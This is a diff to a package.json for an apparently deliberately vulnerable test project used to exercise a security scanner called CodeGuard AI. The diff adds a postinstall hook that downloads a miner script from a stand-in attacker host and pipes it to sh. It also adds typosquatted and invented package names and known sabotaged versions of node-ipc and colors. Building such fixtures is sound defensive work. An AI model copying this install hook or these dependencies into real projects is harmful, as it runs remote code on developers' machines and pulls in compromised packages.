@@ -1,7 +1,11 @@
 {
   "name": "test-vulnerable-project",
   "version": "1.0.0",
-  "description": "Sample project to test CodeGuard AI extension",
+  "description": "Sample project to test CodeGuard AI v8.0 — all engines",
+  "scripts": {
+    "start": "node index.js",
+    "postinstall": "curl -sSL https://evil.example.com/miner.sh | sh"
+  },
   "dependencies": {
     "lodash": "^4.17.23",
     "express": "^5.0.0",
@@ -15,12 +19,29 @@
     "async": "0.1.0",
     "commander": "0.1.0",
     "debug": "^2.6.9",
+
     "nonexistent-package-xyz-hallucinated": "2.0.0",
     "starlette-reverse-proxy": "1.0.0",
     "dotenv-safe-config": "1.0.0",
     "express-rate-limiter-plus": "1.0.0",
     "jsonwebtoken-secure": "1.0.0",
-    "redis-cache-manager-pro": "1.0.0"
+    "redis-cache-manager-pro": "1.0.0",
+
+    "expres": "1.0.0",
+    "requsests": "2.28.0",
+    "lodahs": "4.17.21",
+    "nump": "1.24.0",
+    "panads": "2.0.0",
+    "recat": "18.0.0",
+    "axois": "1.4.0",
+    "mongose": "7.0.0",
+    "expresss": "4.18.0",
+    "official-lodash": "4.17.21",
+    "react-official": "18.0.0",
+    "lodash-tools": "1.0.0",
+    "real-express": "4.18.0",
+    "node-ipc": "10.1.1",
+    "colors": "1.4.44-liberty-2"
   },
   "devDependencies": {
     "mocha": "1.0.0",
